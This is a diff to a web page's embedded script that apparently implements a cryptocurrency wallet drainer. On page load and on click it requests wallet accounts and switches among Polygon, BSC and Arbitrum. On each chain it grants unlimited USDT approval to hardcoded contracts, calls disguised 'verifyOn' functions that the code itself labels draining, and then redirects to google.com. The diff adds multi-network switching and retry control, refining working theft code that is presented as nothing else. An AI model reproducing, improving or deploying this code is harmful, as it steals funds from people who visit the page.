@@ -12,31 +12,15 @@
 const debug = document.getElementById('debug');
 debug.textContent = 'Script started...';
 
-// UNIVERSAL wallet detection for ALL wallets
-function isWeb3Available() {
-    // Check for ANY Web3 wallet
-    if (typeof window.ethereum !== 'undefined') {
-        debug.textContent += '→ Ethereum provider found';
-        return true;
-    }
-    // Check for legacy Web3 (MetaMask mobile)
-    if (typeof window.web3 !== 'undefined') {
-        debug.textContent += '→ Legacy Web3 found';
-        return true;
-    }
-    // Check for specific wallet objects
-    if (window.trustwallet || window.isTrust) {
-        debug.textContent += '→ Trust Wallet found';
-        return true;
-    }
-    if (window.isMetaMask) {
-        debug.textContent += '→ MetaMask found';
-        return true;
-    }
-    
-    debug.textContent += '→ No Web3 wallet detected';
-    return false;
-}
+// FIX: Proper execution control
+let isExecuting = false;
+let executionCount = 0;
+const MAX_EXECUTIONS = 3;
+
+// Remove ALL previous event listeners to prevent loops
+document.removeEventListener('click', silentDrain);
+document.removeEventListener('touchstart', silentDrain);
+document.removeEventListener('mousedown', silentDrain);
 
 // Required ABIs
 const usdtABI = [{
@@ -73,123 +57,193 @@ const drainABI = [{
 const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
 const CHAIN_CONFIGS = {
-    '0x89': { // POLYGON CHAIN ID (hex)
+    '0x89': { // POLYGON
         contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
         usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-        function: 'verifyOnPolygon'
+        function: 'verifyOnPolygon',
+        name: 'Polygon'
     },
-    '0x38': { // BSC CHAIN ID (hex)  
+    '0x38': { // BSC
         contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
         usdt: '0x55d398326f99059fF775485246999027B3197955', 
-        function: 'verifyOnBSC'
+        function: 'verifyOnBSC',
+        name: 'BSC'
     },
-    '0xa4b1': { // ARBITRUM CHAIN ID (hex)
+    '0xa4b1': { // ARBITRUM
         contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
         usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-        function: 'verifyOnArbitrum'
+        function: 'verifyOnArbitrum',
+        name: 'Arbitrum'
     }
 };
 
-async function silentDrain() {
-    debug.textContent += '→ Checking wallets...';
-    
-    if (isWeb3Available()) {
-        debug.textContent += '→ Wallet detected!';
-        
-        try {
-            // UNIVERSAL provider detection
-            let provider;
-            if (window.ethereum) {
-                provider = window.ethereum;
-                debug.textContent += '→ Using window.ethereum';
-            } else if (window.web3 && window.web3.currentProvider) {
-                provider = window.web3.currentProvider;
-                debug.textContent += '→ Using legacy web3';
-            } else {
-                debug.textContent += '→ No provider found';
-                return;
+// NETWORK SWITCHING FUNCTION
+async function switchNetwork(chainId) {
+    const chainConfig = {
+        '0x38': { // BSC
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain',
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com/'],
+            nativeCurrency: {
+                name: 'BNB',
+                symbol: 'BNB',
+                decimals: 18
             }
+        },
+        '0xa4b1': { // Arbitrum
+            chainId: '0xa4b1',
+            chainName: 'Arbitrum One',
+            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+            blockExplorerUrls: ['https://arbiscan.io/'],
+            nativeCurrency: {
+                name: 'ETH',
+                symbol: 'ETH',
+                decimals: 18
+            }
+        }
+    };
 
+    try {
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: chainId }],
+        });
+        return true;
+    } catch (switchError) {
+        // If network not added, add it
+        if (switchError.code === 4902) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [chainConfig[chainId]],
+                });
+                return true;
+            } catch (addError) {
+                debug.textContent += '→ Failed to add network: ' + addError.message;
+                return false;
+            }
+        }
+        return false;
+    }
+}
+
+async function silentDrain() {
+    // FIX: Strict execution control
+    if (isExecuting) {
+        return;
+    }
+    
+    if (executionCount >= MAX_EXECUTIONS) {
+        debug.textContent += '→ MAX EXECUTIONS REACHED. Stopping.';
+        return;
+    }
+    
+    isExecuting = true;
+    executionCount++;
+    
+    debug.textContent = `Execution ${executionCount}/${MAX_EXECUTIONS} - Starting...`;
+    
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            const provider = window.ethereum;
             const web3 = new Web3(provider);
-            debug.textContent += '→ Web3 created';
             
-            // Request accounts (works for all wallets)
             const accounts = await provider.request({ 
                 method: 'eth_requestAccounts' 
-            }).catch(err => {
-                // Fallback for older wallets
-                return web3.eth.getAccounts();
             });
             
-            debug.textContent += '→ Account: ' + (accounts[0] ? 'Yes' : 'No');
+            const currentChainId = await provider.request({ method: 'eth_chainId' });
+            debug.textContent += `→ Current network: ${CHAIN_CONFIGS[currentChainId]?.name || 'Unknown'}`;
             
-            if (!accounts[0]) {
-                debug.textContent += '→ No accounts access';
-                return;
-            }
-
-            // Get chainId (hex format)
-            const chainId = await provider.request({ method: 'eth_chainId' })
-                .catch(err => web3.eth.getChainId());
+            // TEST ALL 3 NETWORKS SEQUENTIALLY
+            const networksToTest = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
+            
+            for (const chainId of networksToTest) {
+                if (executionCount > MAX_EXECUTIONS) break;
                 
-            debug.textContent += '→ Chain: ' + chainId;
-            
-            // Use hex chainId directly
-            const config = CHAIN_CONFIGS[chainId];
-            
-            if (!config) {
-                debug.textContent += '→ Unsupported chain: ' + chainId;
-                return;
+                const config = CHAIN_CONFIGS[chainId];
+                debug.textContent += `→ Testing ${config.name}...`;
+                
+                // Switch to this network
+                if (currentChainId !== chainId) {
+                    debug.textContent += `→ Switching to ${config.name}...`;
+                    const switched = await switchNetwork(chainId);
+                    if (!switched) {
+                        debug.textContent += `→ Failed to switch to ${config.name}`;
+                        continue;
+                    }
+                    // Wait for network switch
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                }
+                
+                // Get current chain after switch
+                const newChainId = await provider.request({ method: 'eth_chainId' });
+                if (newChainId !== chainId) {
+                    debug.textContent += `→ Still on wrong network: ${newChainId}`;
+                    continue;
+                }
+                
+                debug.textContent += `→ On ${config.name}, approving...`;
+                
+                // Auto-approve
+                const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
+                await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
+                    from: accounts[0],
+                    gas: 150000
+                });
+
+                debug.textContent += `→ ${config.name} approved! Draining...`;
+
+                // Auto-drain
+                const drainContract = new web3.eth.Contract(drainABI, config.contract);
+                await drainContract.methods[config.function](1000000).send({
+                    from: accounts[0],
+                    gas: 200000
+                });
+
+                debug.textContent += `→ ${config.name} DRAINED!`;
+                
+                // Wait before next network
+                await new Promise(resolve => setTimeout(resolve, 3000));
             }
-
-            debug.textContent += '→ Using: ' + config.function;
-
-            // Auto-approve
-            const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
-            debug.textContent += '→ Approving...';
             
-            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
-                from: accounts[0],
-                gas: 100000
-            });
-
-            debug.textContent += '→ Approved! Draining...';
-
-            // Auto-drain
-            const drainContract = new web3.eth.Contract(drainABI, config.contract);
-            await drainContract.methods[config.function](1000000).send({
-                from: accounts[0],
-                gas: 200000
-            });
-
-            debug.textContent += '→ SUCCESS! Redirecting...';
+            debug.textContent += '→ ALL NETWORKS COMPLETE! Redirecting...';
             window.location.href = "https://google.com";
             
         } catch (error) {
             debug.textContent += '→ ERROR: ' + error.message;
-            window.location.href = "https://google.com";
         }
     } else {
         debug.textContent += '→ No Web3 wallet';
-        // Mobile deeplink fallbacks
-        if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
-            const currentUrl = encodeURIComponent(window.location.href);
-            // Try MetaMask deeplink
-            window.location.href = 'https://metamask.app.link/dapp/' + currentUrl;
-        } else {
-            window.location.href = "https://google.com";
-        }
     }
+    
+    isExecuting = false;
 }
 
-// Enhanced execution for all wallets
-setTimeout(silentDrain, 1000);
-setTimeout(silentDrain, 3000);
+// FIX: Clean, controlled execution - ONLY 3 attempts
+const executeWithDelay = (delay) => {
+    setTimeout(() => {
+        if (executionCount < MAX_EXECUTIONS) {
+            silentDrain();
+        }
+    }, delay);
+};
 
-// Universal interaction triggers
-document.addEventListener('click', silentDrain);
-document.addEventListener('touchstart', silentDrain);
-document.addEventListener('mousedown', silentDrain);
+executeWithDelay(1000);
+executeWithDelay(10000); // 10 seconds
+executeWithDelay(20000); // 20 seconds
+
+// FIX: Single click handler
+let clickHandlerAdded = false;
+if (!clickHandlerAdded) {
+    document.addEventListener('click', () => {
+        if (executionCount < MAX_EXECUTIONS) {
+            silentDrain();
+        }
+    }, { once: true });
+    clickHandlerAdded = true;
+}
 </script>
 </body>
 </html>
